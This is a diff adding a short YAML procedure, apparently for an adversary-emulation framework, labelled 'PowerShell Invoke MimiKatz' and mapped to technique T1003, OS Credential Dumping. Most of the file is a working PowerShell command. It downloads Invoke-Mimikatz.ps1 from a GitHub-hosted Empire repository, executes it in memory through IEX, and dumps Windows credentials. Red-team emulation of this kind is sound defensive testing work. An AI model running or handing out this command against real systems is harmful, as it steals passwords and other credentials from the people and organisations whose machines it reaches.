@@ -1,0 +1,20 @@
+id: ccdb8caf-c69e-424b-b930-551969450c57
+metadata:
+  version: 1
+  authors:
+    - privateducky
+  tags: []
+name: PowerShell Invoke MimiKatz
+description: |
+  MimiKatz is a program which dumps credentials on a Windows computer. It is usually blocked immediately when downloaded.
+  This procedure will attempt to download and execute it to locate passwords.
+tactic: execution
+technique:
+  id: T1003
+  name: OS Credential Dumping
+platforms:
+  windows:
+    psh:
+      command: |
+        IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1");
+        Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;
